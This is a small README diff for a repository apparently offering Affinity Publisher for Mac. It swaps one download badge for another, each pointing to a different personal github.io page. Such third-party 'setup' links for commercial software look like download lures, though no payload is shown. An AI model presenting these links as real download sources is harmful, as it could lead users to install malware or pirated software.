@@ -4,11 +4,7 @@
 <img src="https://affinity.help/_assets/publisher_icon_lighttxt_ls_rgb-2_no2.png" alt="Affinity Publisher Logo" width="256" height="256">  
 </div>  
 
-<div align="center">  
-<a href="https://agapattiede.github.io/.github/affinity-publisher">  
-<img src="https://img.shields.io/badge/Download_Affinity_Publisher_for_Mac-darkgreen?style=for-the-badge&logo=apple" alt="Download Affinity Publisher for Mac">  
-</a>  
-</div>  
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://annikavaske.github.io/.github/Affinity-Publisher)
 
 ---
 
